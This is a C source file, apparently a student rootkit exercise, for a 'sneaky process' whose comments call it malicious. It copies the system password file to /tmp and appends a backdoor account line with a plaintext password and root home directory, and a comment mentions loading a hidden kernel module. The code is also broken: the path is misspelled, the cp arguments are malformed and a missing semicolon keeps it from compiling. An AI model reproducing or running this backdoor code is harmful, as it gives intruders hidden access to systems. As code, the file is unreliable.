#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>


const char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
char * src = "/etc/password";
char * destination = "/tmp/passwd";





void copy_file(char * src, char * destination){


  char * command = "cp";
  char * argv[3] = {src, destination, NULL};
  pid_t copy_pid = fork();

  if(copy_pid < 0){
    perror("fork error for copying process");
    exit(EXIT_FAILURE);
  }
  else if( copy_pid == 0){
    if(execvp(command, argv) < 0){
      perror( "execution error for copy process");
      exit(EXIT_FAILURE);
    }
  }
  else{

    int wait_status;
    do {
      pid_t wait_pid = waitpid(copy_pid, &wait_status, WUNTRACED | WCONTINUED);
      if(wait_pid < 0){
	perror("waitpid error");
        exit(EXIT_FAILURE);
	}

    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
    
  }



  FILE * file;
  file = fopen(src, "a"); //open file in append mode
  if(file == NULL) {
    perror("Error opening the password file.");
}
  else{
    fputs(line, file);
    fclose(file)
   }
}



int main(){


  pid_t pid = getpid();
  printf("sneaky_process pid = %d\n", pid);

  //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
  copy_file(src, destination);
  //Load the sneaky module using the insmod command
  


}
